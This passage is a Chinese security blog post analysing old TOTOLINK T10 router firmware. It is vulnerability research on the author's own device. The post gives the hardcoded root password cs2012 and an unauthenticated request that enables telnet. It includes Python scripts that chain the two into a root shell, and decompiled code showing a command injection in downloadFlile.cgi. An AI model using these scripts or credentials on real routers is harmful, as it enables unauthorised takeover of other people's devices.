@@ -1,0 +1,753 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="断断续续花了近两个月的时间，终于把totolink的任务完成并写下这篇自认为很详细的博客。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TOTOLINK T10旧版本漏洞挖掘和分析">
+<meta property="og:url" content="http://blingblingxuanxuan.github.io/2021/09/25/analysis-of-totolink-t10/index.html">
+<meta property="og:site_name" content="Clang鱼塘">
+<meta property="og:description" content="断断续续花了近两个月的时间，终于把totolink的任务完成并写下这篇自认为很详细的博客。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2021/09/25/analysis-of-totolink-t10/image-20210815211654119.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2021/09/25/analysis-of-totolink-t10/image-20210815212828443.png">
+<meta property="article:published_time" content="2021-09-25T15:31:46.000Z">
+<meta property="article:modified_time" content="2021-09-25T15:54:37.746Z">
+<meta property="article:author" content="blingbling">
+<meta property="article:tag" content="totolink">
+<meta property="article:tag" content="gdbserver">
+<meta property="article:tag" content="mqtt">
+<meta property="article:tag" content="路由器">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blingblingxuanxuan.github.io/2021/09/25/analysis-of-totolink-t10/image-20210815211654119.png"><title>TOTOLINK T10旧版本漏洞挖掘和分析 | Clang鱼塘</title><link ref="canonical" href="http://blingblingxuanxuan.github.io/2021/09/25/analysis-of-totolink-t10/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-feather-alt"></i></span><span class="header-nav-menu-item__text">文章</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/archives/"><span class="header-nav-submenu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-submenu-item__text">归档</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/categories/"><span class="header-nav-submenu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-submenu-item__text">分类</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/tags/"><span class="header-nav-submenu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-submenu-item__text">标签</span></a></div></div></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-fingerprint"></i></span><span class="header-nav-menu-item__text">关于</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/author/"><span class="header-nav-submenu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-submenu-item__text">作者</span></a></div></div></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-angle-double-down"></i></span><span class="header-nav-menu-item__text">其他</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/friends/"><span class="header-nav-submenu-item__icon"><i class="fas fa-thumbs-up"></i></span><span class="header-nav-submenu-item__text">友链</span></a></div></div></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Clang鱼塘</div><div class="header-banner-info__subtitle"></div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">TOTOLINK T10旧版本漏洞挖掘和分析</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-09-25</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-09-25</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
+        <h1 id="开头三步曲"   >
+          <a href="#开头三步曲" class="heading-link"><i class="fas fa-link"></i></a><a href="#开头三步曲" class="headerlink" title="开头三步曲"></a>开头三步曲</h1>
+      
+        <h2 id="运行试试"   >
+          <a href="#运行试试" class="heading-link"><i class="fas fa-link"></i></a><a href="#运行试试" class="headerlink" title="运行试试"></a>运行试试</h2>
+      <p>拿到设备后，第一件事当然是跑起来看看。</p>
+<p>本次挖洞练习的目标是TOTOLINK路由器，首先将路由器上电并通过LAN口跟电脑连接起来，然后输入<code>192.168.0.1</code>进入路由器配置界面，用户名和密码默认为<code>admin/admin</code>。</p>
+<p><strong>解决网络冲突</strong>：进到配置界面的第一件事就是更改路由器的局域网设置，将其网段改成非<code>192.168.0.x</code>（我将它改成了<code>192.168.55.1</code>）。这一步的目的是防止跟wifi的<code>192.168.0.1</code>冲突，我们可以通过<code>192.168.55.1</code>进入TOTOLINK的配置网页界面。</p>
+<p><strong>设置上网路由</strong>：电脑同时连上了WIFI（通过无线网卡）和TOTOLINK（通过网线），当我们访问网络时，会走哪条线路呢？答案是根据<code>route print</code>打印出的活动路由跃点数（优先级）可以看出，数值越小的，优先级越高，就会选择该通路访问互联网。windows 10中设置跃点数的方式如下：高级网络设置-&gt;更改适配器选项-&gt;选择某一网卡-&gt;属性-&gt;Inernet协议版本4-&gt;高级-&gt;去掉“自动跃点”的勾选-&gt;设置接口跃点数为一个较小的值，如5。</p>
+<p><strong>寻找危险功能</strong>：在TOTOLINK的设置页面上，随意点击探索是否有危险功能可以开启后门等。</p>
+
+        <h2 id="扫描端口"   >
+          <a href="#扫描端口" class="heading-link"><i class="fas fa-link"></i></a><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h2>
+      <p>使用<code>nmap -p 1-65535 192.168.55.1</code>对路由器进行全端口扫描，查看是否开启ssh（22），telnet（23），mqtt（1883）等端口。</p>
+
+        <h2 id="获取固件"   >
+          <a href="#获取固件" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取固件" class="headerlink" title="获取固件"></a>获取固件</h2>
+      <p>在<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&id=15&ids=36" >totolink官网</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>下载对应版本的固件，我用到的是<code>V5.9c.1485_B20180122</code>这个版本。</p>
+<p>使用<code>binwalk -Me xxx</code>对固件进行解包，解出的内容中，在<code>squashfs-root/</code>这个目录下是路由器中文件系统的全部内容，根据这个目录下的文件可以进行逆向分析与漏洞挖掘。</p>
+<p><strong>寻找硬编码</strong>：考虑到后续get shell需要用户名/密码登录系统，先静态在文件系统中寻找是否存在硬编码的情况，对<code>/etc/passwd</code>和<code>/etc/shadow</code>等文件进行分析。了解以上两个文件，参考如下两篇文章：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.computernetworkingnotes.com/linux-tutorials/etc-shadow-file-in-linux-explained-with-examples.html" >/etc/shadow file in Linux Explained with Examples</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://c.biancheng.net/view/840.html" >Linux /etc/shadow（影子文件）内容解析（超详细）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>本次TOTOLINK设备中，在<code>/etc/shadow.sample</code>中找到了root的密码。尝试在<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://cmd5.com/" >cmd5网站</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>上进行密码破解，破解结果为：<code>cs2012</code>。</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat shadow.sample</span></span><br><span class="line">root:$1$BJXeRIOB$w1dFteNXpGDcSSWBMGsl2/:16090:0:99999:7:::</span><br><span class="line">nobody:*:14495:0:99999:7:::</span><br></pre></td></tr></table></div></figure>
+<p><strong>疑问：为什么从<code>/etc/shadow.sample</code>中得到的是<code>/etc/shadow</code>的密码？</strong></p>
+<p>全局搜索字符串”shadow.sample”，以下两个文件中存在对这个文件的操作，将该文件复制到/var/shadow了。</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">squashfs-root$</span><span class="bash"> grep -rin shadow.sample</span></span><br><span class="line">etc/init.d/rcS:79:cp /etc/shadow.sample /var/shadow</span><br><span class="line">etc/init.d/rcS_GW:79:cp /etc/shadow.sample /var/shadow</span><br></pre></td></tr></table></div></figure>
+<p>另，在binwalk解压的etc目录下查看，发现/etc/passwd软连接到了/var/passwd，那么/etc/passwd的值就是/etc/shadow.sample的值。</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">squashfs-root/etc$</span><span class="bash"> ls -al</span></span><br><span class="line">lrwxrwxrwx  1 bling bling    11 1月  22  2018 passwd -&gt; /var/passwd</span><br><span class="line">lrwxrwxrwx  1 bling bling    11 1月  22  2018 shadow -&gt; /var/shadow</span><br></pre></td></tr></table></div></figure>
+
+        <h1 id="先拿SHELL"   >
+          <a href="#先拿SHELL" class="heading-link"><i class="fas fa-link"></i></a><a href="#先拿SHELL" class="headerlink" title="先拿SHELL"></a>先拿SHELL</h1>
+      
+        <h2 id="隐藏的telnet功能"   >
+          <a href="#隐藏的telnet功能" class="heading-link"><i class="fas fa-link"></i></a><a href="#隐藏的telnet功能" class="headerlink" title="隐藏的telnet功能"></a>隐藏的telnet功能</h2>
+      <p>分析固件中web_cste目录下的文件，这些文件就是路由器web服务器中的内容。其中<code>home.asp</code>就是我们访问<code>192.168.55.1</code>时的主页面。这些文件中，<code>telnet.asp</code>首先映入眼帘，这个难道是跟telnet相关的？会不会可以打开telnet功能呢？我们尝试访问一下。</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">~/squashfs-root/web_cste$</span><span class="bash"> ls -al</span></span><br><span class="line">total 152</span><br><span class="line">drwxrwxr-x 10 bling bling  4096 1月  22  2018 .</span><br><span class="line">drwxrwxr-x 14 bling bling  4096 1月  22  2018 ..</span><br><span class="line">drwxrwxr-x  3 bling bling  4096 1月  22  2018 adm</span><br><span class="line">-rwxr-xr-x  1 bling bling   627 1月  22  2018 bottom.asp</span><br><span class="line">drwxrwxr-x  3 bling bling  4096 8月   7 19:04 cgi-bin</span><br><span class="line">lrwxrwxrwx  1 bling bling    15 1月  22  2018 config.dat -&gt; /var/config.dat</span><br><span class="line">-rwxr-xr-x  1 bling bling    59 1月  22  2018 empty1.htm</span><br><span class="line">-rwxr-xr-x  1 bling bling    41 1月  22  2018 empty2.htm</span><br><span class="line">-rwxr-xr-x  1 bling bling    59 1月  22  2018 empty3.htm</span><br><span class="line">-rwxr-xr-x  1 bling bling  1150 1月  22  2018 favicon.ico</span><br><span class="line">drwxrwxr-x  3 bling bling  4096 1月  22  2018 firewall</span><br><span class="line">lrwxrwxrwx  1 bling bling    10 1月  22  2018 fwdir -&gt; /tmp/fwdir</span><br><span class="line">lrwxrwxrwx  1 bling bling    20 1月  22  2018 fw_ln -&gt; /var/cloudupdate.web</span><br><span class="line">-rwxr-xr-x  1 bling bling   162 1月  22  2018 goLogin.htm</span><br><span class="line">-rwxr-xr-x  1 bling bling  2508 1月  22  2018 home.asp</span><br><span class="line">-rwxr-xr-x  1 bling bling   636 1月  22  2018 index.htm</span><br><span class="line">drwxrwxr-x  3 bling bling  4096 1月  22  2018 internet</span><br><span class="line">drwxrwxr-x  3 bling bling  4096 1月  22  2018 js</span><br><span class="line">-rwxr-xr-x  1 bling bling  6686 1月  22  2018 left.asp</span><br><span class="line">-rwxr-xr-x  1 bling bling  7708 1月  22  2018 login.asp</span><br><span class="line">drwxrwxr-x  7 bling bling  4096 1月  22  2018 mobile</span><br><span class="line">drwxrwxr-x  3 bling bling  4096 1月  22  2018 style</span><br><span class="line">-rwxr-xr-x  1 bling bling  1616 1月  22  2018 telnet.asp</span><br><span class="line">-rwxr-xr-x  1 bling bling  3475 1月  22  2018 test.asp</span><br><span class="line">-rwxr-xr-x  1 bling bling  3798 1月  22  2018 title.asp</span><br><span class="line">-rwxr-xr-x  1 bling bling  1039 1月  22  2018 top.asp</span><br><span class="line">drwxrwxr-x  3 bling bling  4096 1月  22  2018 wireless</span><br><span class="line">-rwxr-xr-x  1 bling bling 36999 1月  22  2018 wizard.asp</span><br><span class="line">-rwxr-xr-x  1 bling bling  6551 1月  22  2018 wizard_connect_state.asp</span><br></pre></td></tr></table></div></figure>
+<p>在浏览器中输入<code>http://192.168.55.1/telnet.asp</code>：</p>
+<ul>
+<li>提示让我们登录 - 那就用<code>admin/admin</code>登录</li>
+<li>登录后重定向到了设置页面 - 那尝试再次在浏览器中输入<code>http://192.168.55.1/telnet.asp</code>访问</li>
+<li>此时进入telnet开关界面 - 说明我们可以通过浏览器远程开启或关闭路由器的telnet功能</li>
+<li>前台可控or后台可控？ - 使用burpsuite抓包重放，验证”登录后才能访问telnet功能”的校验是在前端还是后端。</li>
+</ul>
+
+        <h3 id="burpsuite抓包"   >
+          <a href="#burpsuite抓包" class="heading-link"><i class="fas fa-link"></i></a><a href="#burpsuite抓包" class="headerlink" title="burpsuite抓包"></a>burpsuite抓包</h3>
+      <p>以下是抓到的“设置telnet为开”的http post包，可以看到有个Cookie字段。尝试将该Cookie删除后，重发http包控制telnet开关，发现依然能够控制成功。说明路由器的web服务器端并未对登录与否做校验。因此，说明这是一个<strong>前台可控的telnet开关功能</strong>！</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;cgi-bin&#x2F;cstecgi.cgi HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.55.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko&#x2F;20100101 Firefox&#x2F;61.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en-GB,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.55.1&#x2F;telnet.asp</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 56</span><br><span class="line">Cookie: SESSION_ID&#x3D;2:1516628334:2</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;topicurl&quot;:&quot;setting&#x2F;setTelnetCfg&quot;,&quot;telnet_enabled&quot;:&quot;1&quot;&#125;</span><br></pre></td></tr></table></div></figure>
+
+        <h3 id="telnet-shell"   >
+          <a href="#telnet-shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#telnet-shell" class="headerlink" title="telnet shell"></a>telnet shell</h3>
+      <p>利用上述<code>telnet.asp</code>的功能打开telnet，再根据固件中分析到的硬编码root密码，便可拿到路由器的shell了。</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> telnet 192.168.55.1</span></span><br><span class="line">Trying 192.168.55.1...</span><br><span class="line">Connected to 192.168.55.1.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line"></span><br><span class="line">carystdio login: root</span><br><span class="line">Password:</span><br><span class="line">RLX Linux version 2.0</span><br><span class="line">         _           _  _</span><br><span class="line">        | |         | ||_|</span><br><span class="line">   _  _ | | _  _    | | _ ____  _   _  _  _</span><br><span class="line">  | |/ || |\ \/ /   | || |  _ \| | | |\ \/ /</span><br><span class="line">  | |_/ | |/    \   | || | | | | |_| |/    \</span><br><span class="line">  |_|   |_|\_/\_/   |_||_|_| |_|\____|\_/\_/</span><br><span class="line"></span><br><span class="line">For further information check:</span><br><span class="line">http://processor.realtek.com/</span><br><span class="line"><span class="meta">#</span><span class="bash"> ls</span></span><br><span class="line">bin       etc       init      lighttp   proc      sys       usr       web_cste</span><br><span class="line">dev       home      lib       mnt       root      tmp       var</span><br></pre></td></tr></table></div></figure>
+
+        <h3 id="一键get-shell"   >
+          <a href="#一键get-shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#一键get-shell" class="headerlink" title="一键get shell"></a>一键get shell</h3>
+      <p>为了封装以上”打开telnet”+”telnet连接获取shell”过程，通过一个脚本获得TOTOLINK路由器的shell，于是有了如下脚本：</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(log_level=&quot;debug&quot;)</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;192.168.55.1&quot;</span>,<span class="number">80</span>)</span><br><span class="line">msg2 = <span class="string">&#x27;POST /cgi-bin/cstecgi.cgi HTTP/1.1\r\n&#x27;</span></span><br><span class="line">msg2 += <span class="string">&#x27;Host: 192.168.55.1\r\n&#x27;</span></span><br><span class="line">msg2 += <span class="string">&#x27;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\r\n&#x27;</span></span><br><span class="line">msg2 += <span class="string">&#x27;Accept: */*\r\n&#x27;</span></span><br><span class="line">msg2 += <span class="string">&#x27;Accept-Language: en-GB,en;q=0.5\r\n&#x27;</span></span><br><span class="line">msg2 += <span class="string">&#x27;Accept-Encoding: gzip, deflate\r\n&#x27;</span></span><br><span class="line">msg2 += <span class="string">&#x27;Referer: http://192.168.55.1/telnet.asp\r\n&#x27;</span></span><br><span class="line">msg2 += <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n&#x27;</span></span><br><span class="line">msg2 += <span class="string">&#x27;X-Requested-With: XMLHttpRequest\r\n&#x27;</span></span><br><span class="line">msg2 += <span class="string">&#x27;Content-Length: 56\r\n&#x27;</span></span><br><span class="line">msg2 += <span class="string">&#x27;Connection: close\r\n\r\n&#x27;</span></span><br><span class="line">msg2 += <span class="string">&#x27;&#123;&quot;topicurl&quot;:&quot;setting/setTelnetCfg&quot;,&quot;telnet_enabled&quot;:&quot;1&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">io.send(msg2)</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">aa = process([<span class="string">&quot;/usr/bin/telnet&quot;</span>,<span class="string">&quot;192.168.55.1&quot;</span>])</span><br><span class="line">aa.recvuntil(<span class="string">&quot;login&quot;</span>)</span><br><span class="line">aa.sendline(<span class="string">&quot;root&quot;</span>)</span><br><span class="line">aa.recvuntil(<span class="string">&quot;Password&quot;</span>)</span><br><span class="line">aa.sendline(<span class="string">&quot;cs2012&quot;</span>)</span><br><span class="line">aa.sendline(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">aa.interactive()</span><br></pre></td></tr></table></div></figure>
+<p>用request post的方法：</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">response = requests.post(<span class="string">&quot;http://192.168.55.1/cgi-bin/cstecgi.cgi&quot;</span>,data=<span class="string">&#x27;&#123;&quot;topicurl&quot;:&quot;setting/setTelnetCfg&quot;,&quot;telnet_enabled&quot;:&quot;1&quot;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">aa = process([<span class="string">&quot;/usr/bin/telnet&quot;</span>,<span class="string">&quot;192.168.55.1&quot;</span>])</span><br><span class="line">aa.recvuntil(<span class="string">&quot;login&quot;</span>)</span><br><span class="line">aa.sendline(<span class="string">&quot;root&quot;</span>)</span><br><span class="line">aa.recvuntil(<span class="string">&quot;Password&quot;</span>)</span><br><span class="line">aa.sendline(<span class="string">&quot;cs2012&quot;</span>)</span><br><span class="line">aa.sendline(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">aa.interactive()</span><br></pre></td></tr></table></div></figure>
+
+        <h2 id="前台命令注入"   >
+          <a href="#前台命令注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#前台命令注入" class="headerlink" title="前台命令注入"></a>前台命令注入</h2>
+      <p>上一步中，burpsuit抓包重放“telnet开关”对应调用的url是<code>/cgi-bin/cstecgi.cgi</code>，所以我首先考虑的是检视一遍<code>/cgi-bin/</code>目录下的其他文件，是否存在漏洞。</p>
+<p>查看固件中的文件目录，有如下文件，依次检视每个文件。</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">~/squashfs-root/web_cste/cgi-bin$</span><span class="bash"> ls -al</span></span><br><span class="line">total 92</span><br><span class="line">drwxrwxr-x  3 bling bling  4096 8月   7 19:04 .</span><br><span class="line">drwxrwxr-x 10 bling bling  4096 1月  22  2018 ..</span><br><span class="line">-rwxr-xr-x  1 bling bling  8007 1月  22  2018 cstecgi.cgi</span><br><span class="line">-rwxr-xr-x  1 bling bling  9015 1月  22  2018 downloadFlile.cgi</span><br><span class="line">-rwxr-xr-x  1 bling bling   402 1月  22  2018 ExportSettings.sh</span><br><span class="line">-rwxr-xr-x  1 bling bling   383 1月  22  2018 ExportSyslog.sh</span><br><span class="line">drwxrwxr-x  6 bling bling  4096 1月  22  2018 .svn</span><br><span class="line">-rwxr-xr-x  1 bling bling 13671 1月  22  2018 upload_bootloader.cgi</span><br><span class="line">-rwxr-xr-x  1 bling bling 16855 1月  22  2018 upload.cgi</span><br><span class="line">-rwxr-xr-x  1 bling bling 12503 1月  22  2018 upload_settings.cgi</span><br></pre></td></tr></table></div></figure>
+<p>IDA逆向查看这些cgi文件，发现大量<code>system</code>函数的调用。想到是否会存在命令注入漏洞，因此查看了所有的system调用点，确认参数是否外部可控。最终在<code>downloadFlile.cgi</code>的main函数中找到如下漏洞：</p>
+<blockquote>
+<p>这个漏洞基本就是个webshell</p>
+</blockquote>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  v14 = (<span class="keyword">const</span> <span class="keyword">char</span> *)getenv(<span class="string">&quot;QUERY_STRING&quot;</span>);       <span class="comment">//从QUERY_STRING中解析的值给v14</span></span><br><span class="line">  <span class="built_in">memset</span>(v24, <span class="number">0</span>, <span class="keyword">sizeof</span>(v24));</span><br><span class="line">  <span class="built_in">memset</span>(v25, <span class="number">0</span>, <span class="keyword">sizeof</span>(v25));</span><br><span class="line">  <span class="built_in">sprintf</span>(v24, <span class="string">&quot;echo QUERY_STRING:%s &gt;/tmp/download&quot;</span>, v14);     <span class="comment">//v14被格式化成一个字符串</span></span><br><span class="line">  system(v24);          <span class="comment">//字符串被当做命令执行，并未检查v14中是否有特殊字符串。最终导致命令注入</span></span><br></pre></td></tr></table></div></figure>
+<p>用一个简单的url就能触发以上漏洞：</p>
